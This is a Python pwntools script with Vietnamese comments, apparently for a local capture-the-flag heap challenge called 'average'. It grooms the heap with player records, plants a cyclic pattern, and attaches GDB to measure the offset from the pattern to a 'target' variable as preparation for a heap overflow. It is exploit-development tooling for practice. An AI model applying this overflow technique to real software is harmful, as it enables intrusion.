from pwn import *

exe = './average'
elf = ELF(exe)

# Khởi chạy process
io = process(exe)

context.terminal = ['cmd.exe', '/c', 'start', 'cmd.exe', '/c', 'wsl.exe']


# Hàm tạo player
def create_player(idx, extra_len, name, msg):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b'? ', str(extra_len).encode())
    io.sendlineafter(b': ', name)
    io.sendlineafter(b': ', msg)

print("[-] Đang setup Heap để đo đạc...")

# BƯỚC 1: Tạo P0-P3 (Lấp đầy heap)
for i in range(4):
    create_player(i, 0, b'A', b'Init')

# BƯỚC 2: Tạo P4 với cấu hình TẤN CÔNG (extra_len lớn)
# Chúng ta dùng extra_len=128 như dự định exploit
# Name là chuỗi Pattern để dễ tìm trong bộ nhớ
pattern = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP' # 64 bytes pattern
create_player(4, 128, pattern, b'ShortMsg')

# BƯỚC 3: Gắn GDB và tự động tính offset
gdb_cmds = '''
# Dừng tại hàm check để mọi thứ đã ổn định
b *check_target
continue

# 1. Tìm địa chỉ của Target
printf "\\n[+] TARGET ADDRESS: "
p &target
p target

# 2. Tìm địa chỉ của Pattern "AAAABBBB..." trong bộ nhớ
printf "\\n[+] PATTERN LOCATION (Name P4):\\n"
search AAAABBBB

# 3. Tính khoảng cách
printf "\\n[!] HÃY TỰ TÍNH: (Addr Target) - (Addr Pattern) = OFFSET CẦN TÌM\\n"
'''

print("[-] GDB sẽ mở ra. Hãy xem kết quả lệnh search và print!")
gdb.attach(io, gdbscript=gdb_cmds)

# Kích hoạt check để GDB dừng lại
io.sendlineafter(b'> ', b'5')
io.interactive()